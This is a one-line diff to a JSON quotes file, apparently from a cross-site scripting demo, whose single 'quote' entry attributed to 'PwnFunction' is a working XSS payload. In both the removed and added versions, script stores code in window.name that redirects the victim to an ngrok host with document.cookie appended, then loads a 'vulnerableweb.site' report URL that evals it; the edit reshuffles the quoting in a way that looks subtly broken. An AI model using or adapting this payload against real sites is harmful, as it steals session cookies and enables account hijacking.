@@ -1,1 +1,1 @@
-[{"id":1,"quote": "<script> window.name = \"window.location = 'http://0a58d6dc62e2.ngrok.io' + document.cookie;\"; location = \"https://vulnerableweb.site/report?quote_url=<script>eval(name)\"; </script>","author":"PwnFunction"}]
+[{"id":1,"quote": "<script> window.name = \"window.location = 'http://0a58d6dc62e2.ngrok.io'\" + document.cookie ;location = \"https://vulnerableweb.site/report?quote_url=\"+eval(name);</script>","author":"PwnFunction"}]
